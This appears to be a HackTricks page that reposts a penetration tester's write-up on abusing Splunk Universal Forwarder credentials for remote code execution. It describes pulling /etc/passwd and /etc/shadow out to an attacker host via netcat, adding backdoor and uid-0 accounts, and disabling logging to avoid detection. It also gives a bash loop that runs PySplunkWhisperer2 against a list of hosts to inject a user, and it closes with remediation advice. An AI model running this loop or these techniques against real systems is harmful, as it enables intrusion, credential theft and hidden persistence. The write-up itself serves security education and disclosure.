

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


If **enumerating** a machine **internally** or **externally** you find **Splunk running** (port 8090), if you luckily know any **valid credentials** you can **abuse the Splunk service** to **execute a shell** as the user running Splunk. If root is running it, you can escalate privileges to root.

Also if you are **already root and the Splunk service is not listening only on localhost**, you can **steal** the **password** file **from** the Splunk service and **crack** the passwords, or **add new** credentials to it. And maintain persistence on the host.

In the first  image below you can see how a Splunkd web page looks like.

**The following information was copied from** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)

# Abusing Splunk Forwarders For Shells and Persistence

14 Aug 2020

## Description: <a href="#description" id="description"></a>

The Splunk Universal Forwarder Agent (UF) allows authenticated remote users to send single commands or scripts to the agents through the Splunk API. The UF agent doesn’t validate connections coming are coming from a valid Splunk Enterprise server, nor does the UF agent validate the code is signed or otherwise proven to be from the Splunk Enterprise server. This allows an attacker who gains access to the UF agent password to run arbitrary code on the server as SYSTEM or root, depending on the operating system.

This attack is being used by Penetration Testers and is likely being actively exploited in the wild by malicious attackers. Gaining the password could lead to the compromise of hundreds of system in a customer environment.

Splunk UF passwords are relatively easy to acquire, see the secion Common Password Locations for details.

## Context: <a href="#context" id="context"></a>

Splunk is a data aggregation and search tool often used as a Security Information and Event Monitoring (SIEM) system. Splunk Enterprise Server is a web application which runs on a server, with agents, called Universal Forwarders, which are installed on every system in the network. Splunk provides agent binaries for Windows, Linux, Mac, and Unix. Many organizations use Syslog to send data to Splunk instead of installing an agent on Linux/Unix hosts but agent installation is becomming increasingly popular.

Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 when Splunk required any new installations to set a password of 8 characters or higher. As you will note in my demo, complexity is not a requirement as my agent password is 12345678. A remote attacker can brute force the password without lockout, which is a necessity of a log host, since if the account locked out then logs would no longer be sent to the Splunk server and an attacker could use this to hide their attacks. The following screenshot shows the Universal Forwarder agent, this initial page is accessible without authentication and can be used to enumerate hosts running Splunk Universal Forwarder.

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

Splunk documentaiton shows using the same Universal Forwarding password for all agents, I don’t remember for sure if this is a requirement or if individual passwords can be set for each agent, but based on documentaiton and memory from when I was a Splunk admin, I believe all agents must use the same password. This means if the password is found or cracked on one system, it is likely to work on all Splunk UF hosts. This has been my personal experience, allowing compromise of hundreds of hosts quickly.

## Common Password Locations <a href="#common-password-locations" id="common-password-locations"></a>

I often find the Splunk Universal Forwarding agent plain text password in the following locations on networks:

1. Active Directory Sysvol/domain.com/Scripts directory. Administrators store the executible and the password together for efficient agent installation.
2. Network file shares hosting IT installation files
3. Wiki or other build note repositories on internal network

The password can also be accessed in hashed form in Program Files\Splunk\etc\passwd on Windows hosts, and in /opt/Splunk/etc/passwd on Linux and Unix hosts. An attacker can attempt to crack the password using Hashcat, or rent a cloud cracking environment to increase liklihood of cracking the hash. The password is a strong SHA-256 hash and as such a strong, random password is unlikely to be cracked.

## Impact: <a href="#impact" id="impact"></a>

An attacker with a Splunk Universal Forward Agent password can fully compromise all Splunk hosts in the network and gain SYSTEM or root level permissions on each host. I have successfully used the Splunk agent on Windows, Linux, and Solaris Unix hosts. This vulnerability could allow system credentials to be dumped, sensitive data to be exfiltrated, or ransomware to be installed. This vulnerability is fast, easy to use, and reliable.

Since Splunk handles logs, an attacker could reconfigure the Universal Forwarder on the first command run to change the Forwarder location, disabling logging to the Splunk SIEM. This would drastically reduce the chances of being caught by the client Blue Team.

Splunk Universal Forwarder is often seen installed on Domain Controllers for log collection, which could easily allow an attacker to extract the NTDS file, disable antivirus for further exploitation, and/or modify the domain.

Finally, the Universal Forwarding Agent does not require a license, and can be configured with a password stand alone. As such an attacker can install Universal Forwarder as a backdoor persistence mechanism on hosts, since it is a legitimate application which customers, even those who do not use Splunk, are not likely to remove.

## Evidence: <a href="#evidence" id="evidence"></a>

To show an exploitation example I set up a test environment using the latest Splunk version for both the Enterprise Server and the Universal Forwarding agent. A total of 10 images have been attached to this report, showing the following:

1- Requesting the /etc/passwd file through PySplunkWhisper2

![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)

2- Receiving the /etc/passwd file on the attacker system through Netcat

![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)

3- Requesting the /etc/shadow file through PySplunkWhisper2

![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)

4- Receiving the /etc/shadow file on the attacker system through Netcat

![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)

5- Adding the user attacker007 to the /etc/passwd file

![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)

6- Adding the user attacker007 to the /etc/shadow file

![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)

7- Receiving the new /etc/shadow file showing attacker007 is successfully added

![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)

8- Confirming SSH access to the victim using the attacker007 account

![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)

9- Adding a backdoor root account with username root007, with the uid/gid set to 0

![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)

10- Confirming SSH access using attacker007, and then escalating to root using root007

![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)

At this point I have persistent access to the host both through Splunk and through the two user accounts created, one of which provides root. I can disable remote logging to cover my tracks and continue attacking the system and network using this host.

Scripting PySplunkWhisperer2 is very easy and effective.

1. Create a file with IP’s of hosts you want to exploit, example name ip.txt
2. Run the following:

```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```

Host information:

Splunk Enterprise Server: 192.168.42.114\
Splunk Forwarder Agent Victim: 192.168.42.98\
Attacker:192.168.42.51

Splunk Enterprise version: 8.0.5 (latest as of August 12, 2020 – day of lab setup)\
Universal Forwarder version: 8.0.5 (latest as of August 12, 2020 – day of lab setup)

### Remediation Recommendation’s for Splunk, Inc: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

I recommend implementing all of the following solutions to provide defense in depth:

1. Ideally, the Universal Forwarder agent would not have a port open at all, but rather would poll the Splunk server at regular intervals for instructions.
2. Enable TLS mutual authentication between the clients and server, using individual keys for each client. This would provide very high bi-directional security between all Splunk services. TLS mutual authentication is being heavily implemented in agents and IoT devices, this is the future of trusted device client to server communication.
3. Send all code, single line or script files, in a compressed file which is encrypted and signed by the Splunk server. This does not protect the agent data sent through the API, but protects against malicious Remote Code Execution from a 3rd party.

### Remediation Recommendation’s for Splunk customers: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Ensure a very strong password is set for Splunk agents. I recommend at least a 15-character random password, but since these passwords are never typed this could be set to a very large password such as 50 characters.
2. Configure host based firewalls to only allow connections to port 8089/TCP (Universal Forwarder Agent’s port) from the Splunk server.

## Recommendations for Red Team: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. Download a copy of Splunk Universal Forwarder for each operating system, as it is a great light weight signed implant. Good to keep a copy incase Splunk actually fixes this.

## Exploits/Blogs from other researchers <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

Usable public exploits:

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

Related blog posts:

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_** Note: **_ This issue is a serious issue with Splunk systems and it has been exploited by other testers for years. While Remote Code Execution is an intended feature of Splunk Universal Forwarder, the implimentaion of this is dangerous. I attempted to submit this bug via Splunk’s bug bounty program in the very unlikely chance they are not aware of the design implications, but was notified that any bug submissions implement the Bug Crowd/Splunk disclosure policy which states no details of the vulnerability may be discussed publically _ever_ without Splunk’s permission. I requested a 90 day disclosure timeline and was denied. As such, I did not responsibly disclose this since I am reasonably sure Splunk is aware of the issue and has chosen to ignore it, I feel this could severely impact companies, and it is the responsibility of the infosec community to educate businesses.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


